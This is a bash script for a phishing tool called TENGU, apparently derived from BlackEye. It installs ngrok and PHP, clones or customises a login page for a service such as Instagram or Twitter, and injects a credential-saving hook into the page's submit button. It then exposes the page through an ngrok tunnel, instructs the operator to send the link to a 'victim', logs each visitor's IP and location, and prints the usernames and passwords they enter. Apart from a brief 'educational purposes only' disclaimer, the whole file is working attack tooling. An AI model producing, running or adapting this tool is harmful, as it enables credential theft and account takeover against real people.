#!/bin/bash

trap 'killProcesses;main' 2

main() {

    banner
    dependencies
    menu
}

killProcesses() {

    IsNgrokRunning=$(ps aux | grep -o "ngrok" | head -n1)
    IsPhpRunning=$(ps aux | grep -o "php" | head -n1)
    IsTerminatorRunning=$(ps aux | grep -o "terminator" | head -n1)

    if [[ $IsNgrokRunning == *'ngrok'* || $IsPhpRunning == *'php'* || $IsTerminatorRunning == *'terminator'* ]]; then
        pkill ngrok >/dev/null 2>&1
        killall ngrok >/dev/null 2>&1
        pkill php >/dev/null 2>&1
        killall php >/dev/null 2>&1
        pkill terminator >/dev/null 2>&1
        killall terminator >/dev/null 2>&1
    fi

}

dependencies() {

    command -v ngrok >/dev/null 2>&1 || {

        printf "[*] Ngrok is required but it's not installed\n"
        printf "[*] Installing Ngrok...\n\n"

        SysArchitecture=$(uname -m)

        case $SysArchitecture in
        "x86_64")
            NGROK_ARCH="amd64"
            ;;
        "i686")
            NGROK_ARCH="amd64"
            ;;
        "aarch64")
            NGROK_ARCH="arm64"
            ;;
        "armv7l")
            NGROK_ARCH="arm"
            ;;
        *)
            echo "Unsupported architecture: $SysArchitecture"
            exit 1
            ;;
        esac

        wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-$NGROK_ARCH.tgz >/dev/null 2>&1
        sudo tar xvzf ngrok-v3-stable-linux-$NGROK_ARCH.tgz -C /usr/local/bin >/dev/null 2>&1
        chmod +x /usr/local/bin/ngrok
        rm -rf ngrok-v3-stable-linux-$NGROK_ARCH.tgz
    }

    command -v terminator >/dev/null 2>&1 || {
        printf "[*] Terminator is required but it's not installed"
        printf "[*] Installing Terminator...\n\n"
        sudo apt install terminator >/dev/null 2>&1
    }
    command -v php >/dev/null 2>&1 || {
        printf "[*] PHP is required but it's not installed"
        printf "[*] Installing PHP...\n\n"
        sudo apt install php >/dev/null 2>&1
    }
    command -v wget >/dev/null 2>&1 || {
        printf "[*] Wget is required but it's not installed"
        printf "[*] Installing Wget...\n\n"
        sudo apt install wget >/dev/null 2>&1
    }
    command -v tar >/dev/null 2>&1 || {
        printf "[*] Tar is required but it's not installed"
        printf "[*] Installing Tar...\n\n"
        sudo apt install tar >/dev/null 2>&1
    }
    command -v curl >/dev/null 2>&1 || {
        printf "[*] Curl is required but it's not installed"
        printf "[*] Installing Curl...\n\n"
        sudo apt install curl >/dev/null 2>&1
    }
}

banner() {

    GREEN='\033[0;32m'

    clear
    echo -e "${GREEN}
              _______     _____  __   __    ______   __    __   
            /\_______)\ /\_____\/_/\ /\_\  /_/\___\ /\_\  /_/\  
            \(___  __\/( (_____/) ) \ ( (  ) ) ___/( ( (  ) ) ) 
              / / /     \ \__\ /_/   \ \_\/_/ /  ___\ \ \/ / /  
             ( ( (      / /__/_\ \ \   / /\ \ \_/\__\\ \  / /   
              \ \ \    ( (_____\)_) \ (_(  )_)  \/ _/( (__) )   
              /_/_/     \/_____/\_\/ \/_/  \_\____/   \/__\/    "

    printf "     \e[32m\e[1;77m..................................................................\e[0m\n"
    printf "     \e[32m\e[1;77m.  The developer is not responsible for any misuse of this tool  .\e[0m\n"
    printf "     \e[32m\e[1;77m.           Use this tool for educational purporses only!        .\e[0m\n"
    printf "     \e[32m\e[1;77m.                   TENGU v1.0! By @smarttfoxx                   .\e[0m\n"
    printf "     \e[32m\e[1;77m.             Based on BlackEye by @thelinuxchoice               .\e[0m\n"
    printf "     \e[32m\e[1;77m..................................................................\e[0m\n\n"
    printf "     \e[32m\e[1;77m---------- Press CTRL+C to go back, select '3' to quit -----------\e[0m"
    printf "\n\n"

}

menu() {

    printf "\e[38;5;7m[1]\e[1;38;5;226m Default\e[0m     \e[38;5;7m[2]\e[1;38;5;226m Custom\e[0m     \e[38;5;7m[3]\e[1;38;5;226m Quit\e[0m\n\n"
    selectoption
}

selectoption() {

    printf "\e[38;5;208m[*] Please select an option:\e[0m "
    read -r option
    optionSelection
}

optionSelection() {

    case "${option}" in
    1)
        Service="default"
        start
        ;;
    2)
        printf "\n\e[38;5;208m[*] What is the name of your service? (instagram,twitter,facebook and etc)\e[0m\n"
        read -r customservice

        printf "\n\e[38;5;208m[*] Where is your service located? e.g.: /home/root/twitter\e[0m\n"
        printf "\e[38;5;208m[*] Your folder name should be exact the same as your service\e[0m\n"
        read -r indexFileLocation

        while true; do

            if [[ $indexFileLocation == *"$customservice"* && -e "$indexFileLocation" ]]; then

                createCustomService
            
            else

                printf "\n\e[1;38;5;196m[*] Folder not found and/or your service and folder name are not the same!\e[0m\n\n"
                printf "\e[38;5;208m[*] Where is your service located? e.g.: /home/root/twitter\e[0m\n"
                read -r indexFileLocation

            fi
            sleep 1
        done
        ;;
    3)
        exit 1
        ;;
    *)
        printf "\n\e[1;38;5;196m[!] Invalid option!\e[0m\n\n"
        selectoption
        ;;
    esac
}

createCustomService() {

    usernameInputOriginal="inputEmailfield"
    passwordInputOriginal="inputPasswordfield"

    currentPath=$(pwd)
    mkdir services/"$customservice"

    printf "\n\e[38;5;208m[*] Enter the id of your username/email input inside double quotes \"\":\e[0m\n"
    read -r usernameInput

    printf "\n\e[38;5;208m[*] Enter the id of your password input inside double quotes \"\":\e[0m\n"
    read -r passwordInput

    cp -r "$indexFileLocation" "$currentPath"/services/ && sed -i '/<head>/r services/default/ip_cred.html' services/"$customservice"/index.html && sed -i '/<button/ s/<button/<button onclick="saveCredentials()"/g' services/"$customservice"/index.html && sed -i "s/id=$usernameInput/id=$usernameInputOriginal/" services/"$customservice"/index.html && sed -i "s/id=$passwordInput/id=$passwordInputOriginal/" services/"$customservice"/index.html
    cp services/default/log_ip.php services/"$customservice"/ && cp services/default/get_credentials.php services/"$customservice"/

    Service="$customservice"
    start

}

start() {

    clear
    banner
    printf "\e[38;5;208m[*] Starting PHP Service...\n"
    cd services/"$Service" && php -S 127.0.0.1:7777 >/dev/null 2>&1 &
    sleep 2

    printf "[*] Starting ngrok Service...\n"
    terminator -e "ngrok http 7777" >/dev/null 2>&1 &
    sleep 3

    printf "[*] Send your Ngrok link to the Victim\n"
    printf "[*] Waiting for victim to open the link...\e[0m\n\n"
    CheckForFirstVictim
}

CheckForFirstVictim() {

    CheckIP=0

    while true; do

        if [[ -e "services/$Service/access.txt" ]]; then
            CheckIP=1
            FirstVictimFound
        fi

        sleep 1
    done
}

FirstVictimFound() {

    if [[ $CheckIP == 1 ]]; then
        FirstVictimIP=$(head <"services/$Service/access.txt" -n 1)
        printf "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n"
        printf "::\e[1;92m[*] Victim found!                        \e[0m\n"
        printf "::\e[1;92m[*] Victim IP Address: %s                \e[0m\n" "$FirstVictimIP"
        FirstIpCountry=$(curl ipinfo.io/"$FirstVictimIP" 2>&1 | grep "country" | cut -d '"' -f4)
        FirstIpRegion=$(curl ipinfo.io/"$FirstVictimIP" 2>&1 | grep "region" | cut -d '"' -f4)
        FirstIpCity=$(curl ipinfo.io/"$FirstVictimIP" 2>&1 | grep "city" | cut -d '"' -f4)
        printf "::\e[1;92m[*] IP Location: %s                      \e[0m\n\n" "$FirstIpCity","$FirstIpRegion","$FirstIpCountry"
        printf "\e[1;93m::[*] Waiting for credentials...\e[0m\n\n"
    fi

    while [[ ! -e "services/$Service/credentials.txt" ]]; do
        sleep 2
    done

    victimCredentials=$(head <"services/$Service/credentials.txt" -n 1)
    printf "\e[1;92m::[*] Credentials found:\e[0m\n"
    printf "\e[1;91m::[*] %s\e[0m\n" "$victimCredentials"
    printf "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n\n"

    CheckForNewVictim
}

CheckForNewVictim() {

    currentLineCount=$(wc -l <"services/$Service/access.txt")

    printf "\e[1;93m[*] Waiting for new victim...\e[0m\n\n"

    while true; do
        newLineCount=$(wc -l <"services/$Service/access.txt")
        if [[ $newLineCount -gt $currentLineCount ]]; then
            CheckIP=2
            currentLineCount=$newLineCount
            NewVictimFound
        fi

        sleep 1

    done
}

NewVictimFound() {

    if [[ $CheckIP == 2 ]]; then
        CurrentCredentials=$(wc -l <"services/$Service/credentials.txt")
        NewVictimIP=$(tail <"services/$Service/access.txt" -n 1)
        printf "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n"
        printf "::\e[1;92m[*] New victim found!                    \e[0m\n"
        printf "::\e[1;92m[*] Victim IP Address: %s                \e[0m\n" "$NewVictimIP"
        NewIpCountry=$(curl ipinfo.io/"$NewVictimIP" 2>&1 | grep "country" | cut -d '"' -f4)
        NewIpRegion=$(curl ipinfo.io/"$NewVictimIP" 2>&1 | grep "region" | cut -d '"' -f4)
        NewIpCity=$(curl ipinfo.io/"$NewVictimIP" 2>&1 | grep "city" | cut -d '"' -f4)
        printf "::\e[1;92m[*] IP Location: %s                      \e[0m\n\n" "$NewIpCity","$NewIpRegion","$NewIpCountry"
        printf "\e[1;93m::[*] Waiting for credentials...\e[0m\n\n"
    fi

    while true; do
        NewCredentials=$(wc -l <"services/$Service/credentials.txt")
        if [[ $NewCredentials -gt $CurrentCredentials ]]; then
            NewerVictimCredentials=$(tail <"services/$Service/credentials.txt" -n 1)
            break
        fi

        sleep 2
    done

    printf "\e[1;92m::[*] Credentials found:\e[0m\n"
    printf "\e[1;91m::[*] %s\e[0m\n" "$NewerVictimCredentials"
    printf "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n\n"

    CheckForNewVictim
}

main
